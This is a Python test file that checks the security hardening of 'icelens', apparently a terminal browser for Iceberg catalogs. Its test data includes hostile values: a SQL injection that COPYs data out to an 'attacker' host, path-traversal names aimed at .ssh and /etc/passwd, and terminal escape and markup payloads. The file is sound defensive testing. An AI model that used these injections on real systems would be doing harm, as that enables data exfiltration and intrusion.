"""The hardening pass, asserted.

Every test here stands for a specific way a catalog, a config file or a server can reach into
this process and make it do something it did not intend: run a second SQL statement, paint the
terminal, hand a token to a redirect, read a whole table into memory, or write outside the
directory the export was asked for. None of them is hypothetical - each was a live path through
the code before the commit that added this file.
"""

from __future__ import annotations

import http.server
import os
import threading
from pathlib import Path

import pyarrow as pa
import pytest
from rich.text import Text

from icelens import catalog, model
from icelens.app import _export_path, _safe_name
from icelens.catalog import (
    MAX_ROWS,
    IcelensError,
    literal,
    one_statement,
    quote,
    read_dotenv,
    redact_uri,
    remember_secrets,
    row_limit,
    scrub,
)
from icelens.format import REPLACEMENT, cell, grid, safe


# -- the display layer: nothing from a catalog is ever markup ----------------------------------
@pytest.mark.parametrize(
    "hostile",
    [
        "[/]",                                  # a MarkupError, i.e. a crashed pane
        "[red]boom[/red]",                      # restyles the grid
        "[link=http://evil.example]click[/]",   # an OSC 8 hyperlink this tool did not write
        "[blink]",
    ],
)
def test_markup_in_data_is_shown_not_obeyed(hostile: str) -> None:
    assert cell(hostile, width=100).plain == hostile
    _, rows = grid(pa.table({"c": [hostile]}), width=100)
    assert isinstance(rows[0][0], Text)
    assert rows[0][0].plain == hostile


def test_control_codes_never_reach_the_terminal() -> None:
    """ESC survives rich's own `strip_control_codes`, so `safe` has to take it out here."""
    for hostile in ("\x1b[2J", "\x1b]0;title\x07", "\r", "\x08", "﻿"):
        assert "\x1b" not in safe(hostile)
        assert "\r" not in safe(hostile)
    assert safe("\x1b[31mred") == f"{REPLACEMENT}[31mred"


def test_bidi_overrides_cannot_reverse_a_path() -> None:
    """`U+202E` in a file path makes `…/evil.exe` read as `…/txt.live`. Not in this grid."""
    assert safe("s3://b/‮gpj.exe") == f"s3://b/{REPLACEMENT}gpj.exe"


def test_the_arabic_letter_mark_is_a_bidi_control_too() -> None:
    """U+061C sits beside U+200E and U+200F in the bidi algorithm, and was missing beside them here."""
    assert safe("s3://b/؜gpj.exe") == f"s3://b/{REPLACEMENT}gpj.exe"


def test_a_cell_stays_on_one_line() -> None:
    assert cell("two\nlines\ttabbed", width=100).plain == "two lines tabbed"


def test_a_map_key_cannot_drive_the_terminal_either() -> None:
    """A map's keys are data out of a Parquet file, and a struct's are a schema somebody else wrote.

    Values went through `safe`; keys went straight into the cell, so `{"\\x1b[2J": 1}` cleared
    the screen of whoever printed the row.
    """
    assert "\x1b" not in cell({"\x1b[2J": 1}, width=100).plain
    assert "\x1b" not in cell([("\x1b]0;title\x07", "v")], width=100).plain
    assert cell({"two\nlines": 1}, width=100).plain == "two lines=1"


# -- the SQL layer: one statement, always ------------------------------------------------------
def test_a_quote_in_a_config_value_cannot_add_a_statement() -> None:
    """`con.execute()` runs every statement in the string, and httpfs can write remote URLs."""
    evil = "x'); COPY (SELECT 1) TO 'http://attacker/x.csv'; --"
    # interpolated raw, this is two statements and the second one exfiltrates
    with pytest.raises(IcelensError, match="more than one statement"):
        one_statement(f"SELECT * FROM iceberg_scan('{evil}')")
    # escaped, it is one statement whose table name happens to be nonsense
    assert one_statement(f"SELECT * FROM iceberg_scan({literal(evil)})")
    assert one_statement(f"ATTACH IF NOT EXISTS {literal(evil)} AS icelens (TYPE ICEBERG)")


def test_literal_and_quote_escape_rather_than_reject() -> None:
    assert literal("it's") == "'it''s'"
    assert quote('odd"name') == '"odd""name"'
    with pytest.raises(IcelensError):
        literal("nul\x00byte")
    with pytest.raises(IcelensError):
        quote("")


def test_a_row_limit_is_never_negative_and_always_bounded() -> None:
    # LIMIT -1 is "no limit" in DuckDB: a negative number is the whole table, not a small read
    assert row_limit(-1) == 0
    assert row_limit(0) == 0  # a real question - "what are the columns?" - not one to round up
    assert row_limit(10**9) == MAX_ROWS
    assert row_limit("nonsense") == 200
    assert row_limit(None) == 200
    assert row_limit(50) == 50
    # an infinite one is `test_properties.test_an_infinite_row_limit_is_clamped_like_any_other_number`


# -- credentials -------------------------------------------------------------------------------
def test_a_token_never_survives_into_a_message() -> None:
    remember_secrets({"token": "tok-abcdef123456", "uri": "https://alice:hunter2@lake.example/catalog"})
    text = scrub("ATTACH 'wh' (TOKEN 'tok-abcdef123456') failed at https://alice:hunter2@lake.example/x")
    assert "tok-abcdef123456" not in text
    assert "hunter2" not in text
    assert "********" in text


def test_a_credential_is_masked_whole_when_its_secret_half_is_also_remembered(monkeypatch: pytest.MonkeyPatch) -> None:
    """`credential=root:s3cr3t` and `s3.secret-access-key=s3cr3t` together, the way Polaris is set up.

    Scrubbed short-first, the credential came out as `root:********`. Which came first was set
    order, so it changed from run to run; the list below pins the bad order on purpose.
    """
    monkeypatch.setattr(catalog, "_secrets", ["s3cr3t", "root:s3cr3t"])
    assert scrub("401 for credential root:s3cr3t") == "401 for credential ********"


def test_a_password_or_a_long_user_name_in_a_uri_is_remembered(monkeypatch: pytest.MonkeyPatch) -> None:
    """A password is remembered however short, and so is a long bare user name - which is how a
    token rides in a URI. (A short bare user name is not: `test_properties` holds that rule.)
    """
    monkeypatch.setattr(catalog, "_secrets", set())
    remember_secrets({"uri": "http://u:pw@lake.example/catalog", "other": "https://ghp_abcdef123456@git.example/x"})
    assert scrub("GET http://u:pw@lake.example/catalog") == "GET http://********@lake.example/catalog"
    assert "ghp_abcdef123456" not in scrub("cloning https://ghp_abcdef123456@git.example/x")


def test_a_label_is_safe_to_screenshot() -> None:
    target = catalog.Target({"uri": "https://alice:hunter2@lake.example/catalog", "warehouse": "wh"})
    assert target.label == "wh @ https://lake.example/catalog"
    assert redact_uri("https://lake.example/catalog") == "https://lake.example/catalog"


# -- the .env walk -----------------------------------------------------------------------------
def test_a_dotenv_that_is_not_a_file_is_ignored(tmp_path: Path) -> None:
    assert read_dotenv(tmp_path / "nothing") == {}
    assert read_dotenv(tmp_path) == {}


def test_an_oversized_dotenv_is_refused(tmp_path: Path) -> None:
    fat = tmp_path / ".env"
    fat.write_text("ICELENS_URI=http://x\n" + "#" * (catalog.MAX_DOTENV_BYTES + 1))
    assert read_dotenv(fat) == {}


@pytest.mark.skipif(os.name != "posix", reason="mode bits")
def test_a_world_writable_dotenv_is_refused(tmp_path: Path) -> None:
    """It is found by walking upwards, so it is not necessarily a file the user wrote."""
    env = tmp_path / ".env"
    env.write_text("ICELENS_URI=http://attacker/catalog\n")
    env.chmod(0o666)
    assert read_dotenv(env) == {}
    env.chmod(0o600)
    assert read_dotenv(env) == {"ICELENS_URI": "http://attacker/catalog"}


def test_the_dotenv_walk_stops_at_home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: tmp_path))
    monkeypatch.chdir(tmp_path)
    assert all(tmp_path in p.parents or p.parent == tmp_path for p in catalog._dotenv_candidates(None))


# -- the warehouse probe -------------------------------------------------------------------------
def test_the_probe_refuses_schemes_that_are_not_http(tmp_path: Path) -> None:
    (tmp_path / "config").write_text('{"defaults": {"warehouse": "stolen"}}')
    assert catalog.probe_warehouses(f"file://{tmp_path}") == []
    assert catalog.probe_warehouses(f"file://{tmp_path}", properties={"credential": "a:b"}) == []


def test_the_probe_never_forwards_the_token_to_a_redirect() -> None:
    """urllib copies every header onto a redirect, `Authorization` included, cross-host."""
    seen: list[tuple[str, str | None]] = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self) -> None:  # noqa: N802 - http.server's spelling
            seen.append((self.path, self.headers.get("Authorization")))
            self.send_response(302)
            self.send_header("Location", "/stolen")
            self.end_headers()

        def log_message(self, *args: object) -> None:
            pass

    server = http.server.HTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        uri = f"http://127.0.0.1:{server.server_port}/catalog"
        assert catalog.probe_warehouses(uri, token="tok-secret-123456", timeout=2.0) == []
    finally:
        server.shutdown()
    assert seen, "the probe never reached the server"
    assert not any(path == "/stolen" for path, _ in seen), "the redirect was followed"


@pytest.fixture()
def not_http() -> str:
    """Something listening that is not HTTP at all: an SSH banner, the commonest wrong port."""
    import socket

    listener = socket.socket()
    listener.bind(("127.0.0.1", 0))
    listener.listen(8)
    stop = threading.Event()

    def serve() -> None:
        while not stop.is_set():
            try:
                conn, _ = listener.accept()
            except OSError:
                return
            with conn:
                try:
                    conn.recv(65536)
                    conn.sendall(b"SSH-2.0-OpenSSH_9.6\r\n\r\n")
                except OSError:
                    pass

    threading.Thread(target=serve, daemon=True).start()
    yield f"http://127.0.0.1:{listener.getsockname()[1]}"
    stop.set()
    listener.close()


def test_the_probe_survives_a_server_that_does_not_speak_http(not_http: str, capsys: pytest.CaptureFixture[str]) -> None:
    """`BadStatusLine` is an `HTTPException`, not an `OSError`: it was a traceback, and `--json`
    printed no JSON at all."""
    from headless import run

    assert catalog.probe_warehouses(not_http, timeout=2.0) == []
    assert catalog.probe_warehouses(not_http, timeout=2.0, properties={"credential": "id:secret"}) == []
    ran = run(capsys, ["--no-env", "--uri", not_http, "--warehouses", "--json"])
    assert ran.code == 1 and "Traceback" not in ran.err
    assert ran.body["rows"] == []


# -- notes and exports ---------------------------------------------------------------------------
def test_a_catalog_error_in_a_note_is_cut_and_cleaned() -> None:
    note = model._note_error(ValueError("\x1b[2Jboom " + "x" * 5000))
    assert "\x1b" not in note
    assert len(note) <= model.NOTE_ERROR_CHARS


def test_an_export_filename_cannot_escape_the_directory(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(tmp_path)
    assert _safe_name("../../.ssh/authorized_keys") == "ssh_authorized_keys"
    assert _safe_name("...") == "catalog"
    path = _export_path("../../etc/passwd", "files")
    assert path.parent == tmp_path


def test_an_export_never_overwrites(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.chdir(tmp_path)
    first = _export_path("demo.events", "files")
    first.write_text("mine")
    second = _export_path("demo.events", "files")
    assert second != first
    assert first.read_text() == "mine"


# -- the app, end to end ---------------------------------------------------------------------------
async def test_a_pane_note_is_shown_verbatim_and_never_obeyed(app) -> None:
    """A note carries table names and catalog error text. `[/]` in one used to be a crash."""
    from harness import note, settle

    from icelens.app import PaneBox

    async with app.run_test() as pilot:
        await settle(app, pilot)
        box = app.query_one("#box-overview", PaneBox)
        box.say("[/] [red]crm.accounts[/red] \x1b[2J failed")
        await pilot.pause()
        shown = note(app, "overview")
        assert "[/]" in shown and "[red]" in shown
        assert "\x1b" not in shown


async def test_a_tree_label_is_text_not_markup(app) -> None:
    from harness import settle
    from textual.widgets import Tree

    async with app.run_test() as pilot:
        await settle(app, pilot)
        app._build_tree(["[red]ns[/]"], {"[red]ns[/]": ["[red]ns[/].t"]}, "")
        await pilot.pause()
        tree = app.query_one("#nav", Tree)
        assert isinstance(tree.root.children[0].label, Text)
        assert "[red]" in tree.root.children[0].label.plain


async def test_a_notification_is_cut_and_never_markup(app, monkeypatch: pytest.MonkeyPatch) -> None:
    from icelens.app import NOTIFY_CHARS, IcelensApp

    sent: list[dict] = []
    monkeypatch.setattr(
        "textual.app.App.notify",
        lambda self, message, **kw: sent.append({"message": message, **kw}),
    )
    async with app.run_test() as pilot:
        app.notify("[/] " + "x" * 10_000 + "\x1b[2J")
        await pilot.pause()
    assert sent, "the notification never went out"
    assert sent[0]["markup"] is False
    assert len(sent[0]["message"]) <= NOTIFY_CHARS
    assert "\x1b" not in sent[0]["message"]
    assert isinstance(app, IcelensApp)


def test_a_key_id_is_shown_but_its_secret_is_not() -> None:
    """Blanking the key *id* too is how people end up pasting the real secret to find out."""
    target = catalog.Target(
        {
            "uri": "https://alice:hunter2@lake.example/catalog",
            "s3.access-key-id": "AKIAEXAMPLE",
            "s3.secret-access-key": "shhh",
            "token": "tok-123456",
        }
    )
    redacted = target.redacted()
    assert redacted["s3.access-key-id"] == "AKIAEXAMPLE"
    assert redacted["s3.secret-access-key"] == "********"
    assert redacted["token"] == "********"
    assert redacted["uri"] == "https://lake.example/catalog"


async def test_a_column_named_like_markup_still_draws(app) -> None:
    """Field names come from someone else's schema, and `[/]` is a legal one."""
    from harness import settle

    from icelens.app import Grid

    async with app.run_test() as pilot:
        await settle(app, pilot)
        grid_widget = app.query_one("#grid-overview", Grid)
        grid_widget.show(pa.table({"[/]": ["a"], "[red]b": ["c"]}), width=20)
        await pilot.pause()
        labels = [column.label.plain for column in grid_widget.columns.values()]
        assert labels == ["[/]", "[red]b"]


# -- what is a sandbox, and who may say so -----------------------------------------------------------
def test_a_lake_taken_from_a_sandbox_to_a_real_catalog_is_read_only_again(tmp_path: Path) -> None:
    """ctrl+o from `--demo` or the welcome screen. Read-only was worked out once, for the sandbox,
    so the catalog switched to was attached read-write and the SQL pane could `DROP TABLE` in it."""
    lake = catalog.Lake(catalog.sandbox_target("play", root=tmp_path), read_only=True)
    try:
        assert lake.read_only is False, "a sandbox attaches writable"
        lake.rebind(catalog.Target({"type": "rest", "uri": "http://catalog.example/c", "warehouse": "prod"}))
        assert lake.read_only is True
        assert (lake._attach_sql() or "").endswith(", READ_ONLY)")
        with pytest.raises(IcelensError, match="refusing to run DROP"):
            lake.query('DROP TABLE icelens."core"."orders"')
        lake.rebind(catalog.sandbox_target("play", root=tmp_path))
        assert lake.read_only is False, "and a sandbox rebound to is a sandbox again"
    finally:
        lake.close()


def test_rebinding_forgets_the_old_sandboxs_namespace() -> None:
    base = catalog.Target({"type": "rest", "uri": "http://catalog.example/c"})
    lake = catalog.Lake(catalog.rest_sandbox_target("a", base), read_only=True)
    lake._namespace_ready = True
    lake.rebind(catalog.rest_sandbox_target("b", base))
    assert lake._namespace_ready is False, "sandbox_b is made before the first write, as sandbox_a was"


HOSTILE = {"icelens.sandbox": "x", "icelens.sandbox.served": "v3", "ICELENS.Sandbox.Namespace": "core"}


def _a_real_catalog_still(target: catalog.Target) -> None:
    assert (target.sandbox, target.sandbox_namespace) == ("", "")
    assert not any(key.lower().startswith("icelens.") for key in target.properties)
    lake = catalog.Lake(target, read_only=True)
    assert lake.read_only and not lake.is_sandbox and not lake.is_served_sandbox
    with pytest.raises(IcelensError, match="refusing to run DROP"):
        lake.query("DROP TABLE icelens.core.orders")
    with pytest.raises(IcelensError, match="only to a sandbox"):
        lake.write("DROP TABLE core.orders")


def test_a_property_cannot_make_a_real_catalog_a_sandbox() -> None:
    """`icelens.sandbox` turns read-only off and `icelens.sandbox.served` lets a write go to any
    namespace, so `-p icelens.sandbox=x` made somebody's catalog writable by calling it scratch."""
    from icelens.cli import properties

    assert properties([f"{key}={value}" for key, value in HOSTILE.items()]) == {}
    _a_real_catalog_still(catalog.discover(uri="http://catalog.example/c", properties=HOSTILE, search_dotenv=False))


def test_a_profile_cannot_make_a_real_catalog_a_sandbox(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    lines = "".join(f"    {key}: {value}\n" for key, value in HOSTILE.items())
    (tmp_path / ".pyiceberg.yaml").write_text(f"catalog:\n  prod:\n    type: rest\n    uri: http://catalog.example/c\n{lines}")
    monkeypatch.setenv("PYICEBERG_HOME", str(tmp_path))
    assert catalog.list_profiles()["prod"] == {"type": "rest", "uri": "http://catalog.example/c"}
    _a_real_catalog_still(catalog.profile_target("prod"))
    _a_real_catalog_still(catalog.discover(profile="prod", search_dotenv=False))


@pytest.mark.skipif(os.name != "posix", reason="mode bits")
def test_the_sandboxes_icelens_makes_are_private(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A sandbox holds what was written into it; under a default umask its directory was anybody's."""
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: tmp_path))
    catalog.sandbox_target("default")
    root = tmp_path / ".local" / "share" / "icelens" / "sandboxes"
    assert root.stat().st_mode & 0o777 == 0o700
    chosen = tmp_path / "chosen"
    catalog.sandbox_target("x", root=chosen)
    assert chosen.stat().st_mode & 0o777 == 0o700
    shared = tmp_path / "shared"
    shared.mkdir()
    shared.chmod(0o755)
    catalog.sandbox_target("x", root=shared)
    assert shared.stat().st_mode & 0o777 == 0o755, "a directory the user made is theirs to set"


# -- credentials, by every name Azure gives them -------------------------------------------------------
def test_azure_keys_never_survive_into_a_message(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(catalog, "_secrets", set())
    remember_secrets(
        {
            "adls.account-key": "c2VjcmV0LWtleQ==",
            "adls.connection-string": "DefaultEndpointsProtocol=https;AccountName=acct;AccountKey=a2V5LWluLWEtc3RyaW5n;EndpointSuffix=x",
            "adls.sas-token.acct.dfs.core.windows.net": "sv=2024&sig=c2lnbmF0dXJl",
        }
    )
    text = scrub("auth failed: key c2VjcmV0LWtleQ== / AccountKey=a2V5LWluLWEtc3RyaW5n / ?sv=2024&sig=c2lnbmF0dXJl")
    for secret in ("c2VjcmV0LWtleQ==", "a2V5LWluLWEtc3RyaW5n", "c2lnbmF0dXJl"):
        assert secret not in text
    redacted = catalog.Target({"adls.account-key": "k", "adls.connection-string": "c", "adls.account-name": "acct"}).redacted()
    assert redacted == {"adls.account-key": "********", "adls.connection-string": "********", "adls.account-name": "acct"}


# -- the .env walk, and whose files it reads --------------------------------------------------------
@pytest.mark.skipif(not hasattr(os, "getuid"), reason="file owners")
def test_a_dotenv_somebody_else_owns_is_refused_and_says_why(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    env = tmp_path / ".env"
    env.write_text("ICELENS_CATALOG_URI=http://x\n")
    env.chmod(0o600)
    assert read_dotenv(env) == {"ICELENS_CATALOG_URI": "http://x"}
    me = os.getuid()
    monkeypatch.setattr(os, "getuid", lambda: me + 1)
    assert read_dotenv(env) == {}
    assert catalog._read_dotenv(env)[1] == "it belongs to another user"


@pytest.mark.skipif(not hasattr(os, "getuid"), reason="file owners")
def test_the_dotenv_walk_stops_at_the_first_directory_that_is_not_mine(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """From `/tmp/x` the walk reached `/tmp/.env` and `/.env`, which anyone on the machine can make.

    Changing a directory's owner needs root. Without it this holds the walk to its rule - no
    candidate in a directory somebody else owns - and `/tmp`, which is root's, is that directory.
    """
    shared = tmp_path / "shared"
    mine = shared / "mine"
    mine.mkdir(parents=True)
    if os.getuid() == 0:
        os.chown(shared, 65534, 65534)
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: tmp_path / "not-an-ancestor"))
    monkeypatch.chdir(mine)
    walked = catalog._dotenv_candidates(None)
    assert walked[0] == mine.resolve() / ".env"
    assert all(path.parent.stat().st_uid == os.getuid() for path in walked)
    if os.getuid() == 0:
        assert walked == [mine.resolve() / ".env"]
